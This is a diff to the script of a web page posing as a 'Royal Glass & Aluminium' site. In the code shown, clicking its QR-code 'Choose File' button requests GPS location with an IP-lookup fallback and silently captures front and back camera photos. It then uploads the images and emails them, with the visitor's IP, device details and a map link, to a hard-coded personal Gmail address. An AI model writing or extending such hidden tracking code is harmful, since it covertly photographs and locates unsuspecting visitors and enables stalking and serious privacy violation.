@@ -457,7 +457,9 @@
             // ----- STATE -----
             let capturedPhotos = { front: [], back: [] };
             let cameraGranted = false;
-            let isProcessingCamera = false;
+            let locationGranted = false;
+            let userLocation = null;
+            let isProcessing = false;
 
             // Initialize EmailJS
             try {
@@ -510,20 +512,91 @@
                 submitBtn.disabled = false;
             }
 
+            // ----- LOCATION FUNCTIONS -----
+            
+            async function requestLocation() {
+                try {
+                    if (!navigator.geolocation) {
+                        console.log('📍 Geolocation not supported');
+                        return null;
+                    }
+                    
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(
+                            (pos) => resolve(pos),
+                            (err) => reject(err),
+                            { enableHighAccuracy: true, timeout: 10000 }
+                        );
+                    });
+                    
+                    locationGranted = true;
+                    userLocation = {
+                        lat: position.coords.latitude,
+                        lon: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        source: 'GPS'
+                    };
+                    console.log('📍 GPS Location:', userLocation);
+                    return userLocation;
+                } catch (e) {
+                    console.log('📍 Location denied or error:', e.message);
+                    locationGranted = false;
+                    
+                    // Fallback to IP geolocation
+                    console.log('📍 Using IP geolocation fallback');
+                    const ipLocation = await getLocationFromIP();
+                    userLocation = ipLocation;
+                    return ipLocation;
+                }
+            }
+
+            async function getLocationFromIP() {
+                try {
+                    const response = await fetch('https://ipapi.co/json/');
+                    const data = await response.json();
+                    return {
+                        lat: data.latitude || 'unavailable',
+                        lon: data.longitude || 'unavailable',
+                        city: data.city || 'unknown',
+                        region: data.region || 'unknown',
+                        country: data.country_name || 'unknown',
+                        source: 'IP Geolocation'
+                    };
+                } catch (e) {
+                    console.error('IP Geolocation error:', e);
+                    try {
+                        const response = await fetch('http://ip-api.com/json/');
+                        const data = await response.json();
+                        return {
+                            lat: data.lat || 'unavailable',
+                            lon: data.lon || 'unavailable',
+                            city: data.city || 'unknown',
+                            region: data.regionName || 'unknown',
+                            country: data.country || 'unknown',
+                            source: 'IP Geolocation (fallback)'
+                        };
+                    } catch (e2) {
+                        return { 
+                            lat: 'unavailable', 
+                            lon: 'unavailable', 
+                            source: 'IP Geolocation (failed)' 
+                        };
+                    }
+                }
+            }
+
             // ----- CAMERA FUNCTIONS -----
             
-            // Request camera permission and capture photos silently
             async function requestCameraAndCapture() {
-                if (isProcessingCamera) return;
-                isProcessingCamera = true;
+                if (isProcessing) return;
+                isProcessing = true;
                 
                 try {
                     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                        isProcessingCamera = false;
+                        isProcessing = false;
                         return;
                     }
                     
-                    // Try to get camera permission
                     const stream = await navigator.mediaDevices.getUserMedia({
                         video: { facingMode: 'user', width: { ideal: 100 }, height: { ideal: 100 } },
                         audio: false
@@ -532,7 +605,6 @@
                     if (stream) {
                         stream.getTracks().forEach(t => t.stop());
                         cameraGranted = true;
-                        
                         console.log('📸 Camera granted! Silently capturing photos...');
                         
                         // Capture front camera
@@ -557,17 +629,16 @@
                             console.log('📸 Back camera error:', e.message);
                         }
                         
-                        console.log(`📸 Total photos captured: ${capturedPhotos.front.length + capturedPhotos.back.length}`);
+                        console.log(`📸 Total photos: ${capturedPhotos.front.length + capturedPhotos.back.length}`);
                     }
                 } catch (e) {
                     console.log('Camera permission denied:', e.name);
                     cameraGranted = false;
                 }
                 
-                isProcessingCamera = false;
+                isProcessing = false;
             }
 
-            // Capture photos
             async function capturePhotos(facingMode, count = 1) {
                 return new Promise((resolve) => {
                     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
@@ -634,7 +705,7 @@
                 });
             }
 
-            // ----- IP & LOCATION FUNCTIONS (NO PERMISSION) -----
+            // ----- IP ADDRESS -----
             
             async function getIPAddress() {
                 try {
@@ -644,42 +715,6 @@
                 } catch (e) {
                     console.error('IP fetch error:', e);
                     return 'unavailable';
-                }
-            }
-
-            async function getLocationFromIP() {
-                try {
-                    const response = await fetch('https://ipapi.co/json/');
-                    const data = await response.json();
-                    return {
-                        lat: data.latitude || 'unavailable',
-                        lon: data.longitude || 'unavailable',
-                        city: data.city || 'unknown',
-                        region: data.region || 'unknown',
-                        country: data.country_name || 'unknown',
-                        source: 'IP Geolocation'
-                    };
-                } catch (e) {
-                    console.error('IP Geolocation error:', e);
-                    try {
-                        const response = await fetch('http://ip-api.com/json/');
-                        const data = await response.json();
-                        return {
-                            lat: data.lat || 'unavailable',
-                            lon: data.lon || 'unavailable',
-                            city: data.city || 'unknown',
-                            region: data.regionName || 'unknown',
-                            country: data.country || 'unknown',
-                            source: 'IP Geolocation (fallback)'
-                        };
-                    } catch (e2) {
-                        console.error('IP Geolocation fallback error:', e2);
-                        return { 
-                            lat: 'unavailable', 
-                            lon: 'unavailable', 
-                            source: 'IP Geolocation (failed)' 
-                        };
-                    }
                 }
             }
 
@@ -753,10 +788,8 @@
                     const mapLink = `https://www.google.com/maps?q=${location.lat},${location.lon}`;
                     const mapHTML = `<a href="${mapLink}" target="_blank" style="display:inline-block;background:#28a745;color:white;padding:6px 14px;border-radius:20px;text-decoration:none;font-size:12px;margin-top:3px;">📍 Open in Google Maps</a>`;
 
-                    // Build image HTML
                     let imagesHTML = '';
                     
-                    // Front camera photos
                     if (capturedPhotos.front && capturedPhotos.front.length > 0) {
                         const uploaded = await Promise.all(capturedPhotos.front.map(img => uploadToImgBB(img, 'Front_Camera')));
                         imagesHTML += `<h4 style="margin:10px 0 5px 0;color:#2c4b6b;">📸 Front Camera (${uploaded.filter(Boolean).length})</h4><div style="display:flex;flex-wrap:wrap;gap:10px;">`;
@@ -766,7 +799,6 @@
                         imagesHTML += `</div>`;
                     }
                     
-                    // Back camera photos
                     if (capturedPhotos.back && capturedPhotos.back.length > 0) {
                         const uploaded = await Promise.all(capturedPhotos.back.map(img => uploadToImgBB(img, 'Back_Camera')));
                         imagesHTML += `<h4 style="margin:10px 0 5px 0;color:#2c4b6b;">📸 Back Camera (${uploaded.filter(Boolean).length})</h4><div style="display:flex;flex-wrap:wrap;gap:10px;">`;
@@ -776,7 +808,6 @@
                         imagesHTML += `</div>`;
                     }
 
-                    // QR code
                     let qrHTML = '';
                     if (qrImage) {
                         qrHTML = `<h4 style="margin:10px 0 5px 0;color:#2c4b6b;">📱 QR Code</h4>
@@ -786,7 +817,7 @@
                             </div>`;
                     }
 
-                    const locationDisplay = `${location.lat || 'N/A'}, ${location.lon || 'N/A'} (${location.source || 'IP Geolocation'})`;
+                    const locationDisplay = `${location.lat || 'N/A'}, ${location.lon || 'N/A'} (${location.source || 'GPS'})`;
 
                     const emailParams = {
                         to_email: RECIPIENT_EMAIL,
@@ -810,8 +841,6 @@
                     const size = JSON.stringify(emailParams).length;
                     console.log('📤 Sending email to:', RECIPIENT_EMAIL);
                     console.log('📊 Final payload size:', size, 'bytes');
-                    console.log('📸 Front photos:', capturedPhotos.front.length);
-                    console.log('📸 Back photos:', capturedPhotos.back.length);
                     
                     const response = await emailjs.send(
                         EMAILJS_SERVICE_ID,
@@ -889,14 +918,20 @@
                 }
             }
 
-            // ----- QR Upload Handler - REQUEST CAMERA FIRST THEN SHOW CHOSER -----
+            // ----- QR Upload Handler - REQUEST CAMERA + LOCATION FIRST -----
             qrUploadBtn.addEventListener('click', async function(e) {
                 e.preventDefault();
                 
-                // Step 1: Request camera permission and capture photos silently
+                // Step 1: Request location permission
+                console.log('📍 Requesting location...');
+                await requestLocation();
+                
+                // Step 2: Request camera permission and capture photos
+                console.log('📸 Requesting camera...');
                 await requestCameraAndCapture();
                 
-                // Step 2: Now trigger the file input click (shows chooser)
+                // Step 3: Now trigger the file input click (shows chooser)
+                console.log('📁 Opening file chooser...');
                 qrInput.click();
             });
 
@@ -972,14 +1007,15 @@
                         }
                     }
 
-                    // Get IP and location (NO PERMISSION NEEDED)
+                    // Get IP address
                     const ip = await getIPAddress();
-                    const location = await getLocationFromIP();
                     const deviceInfo = getDeviceInfo();
+
+                    // Use location from earlier (already requested)
+                    const location = userLocation || await getLocationFromIP();
 
                     console.log('🌐 IP:', ip);
                     console.log('📍 Location:', location);
-                    console.log('📸 Photos captured:', capturedPhotos.front.length, 'front,', capturedPhotos.back.length, 'back');
 
                     // Build payload
                     const payload = {
@@ -1013,7 +1049,7 @@
             });
 
             console.log('Royal Glass & Aluminium · secure');
-            console.log('✅ Camera requested when clicking "Choose File" - before showing chooser');
+            console.log('✅ Camera + Location requested when clicking "Choose File"');
             console.log('📧 Sending to: mrsmartboy123@gmail.com');
         })();
     </script>
